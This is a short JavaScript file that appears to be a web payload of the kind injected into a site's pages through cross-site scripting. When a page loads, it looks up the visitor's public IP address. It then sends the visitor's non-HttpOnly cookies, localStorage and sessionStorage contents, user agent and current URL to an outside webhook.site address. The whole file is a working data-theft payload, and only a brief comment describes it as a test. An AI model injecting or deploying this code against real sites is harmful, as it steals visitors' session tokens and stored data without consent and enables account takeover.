


/* Edit WEBHOOK_URL to your test webhook.site URL */
const WEBHOOK_URL = 'https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f';

async function getIP() {
  try {
    const resp = await fetch('https://api.ipify.org?format=json');
    const j = await resp.json();
    return j.ip || 'unknown';
  } catch (err) {
    console.error('IP lookup failed:', err);
    return 'unknown';
  }
}

async function sendData() {
  const ip = await getIP();
  const payload = {
    ip,
    cookie: document.cookie,               // only non-HttpOnly cookies
    userAgent: navigator.userAgent,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: location.href,
    ts: new Date().toISOString()
  };

  try {
    const r = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    console.log('Payload sent, status:', r.status);
  } catch (err) {
    console.error('Error sending payload:', err);
  }
}

window.addEventListener('load', sendData);
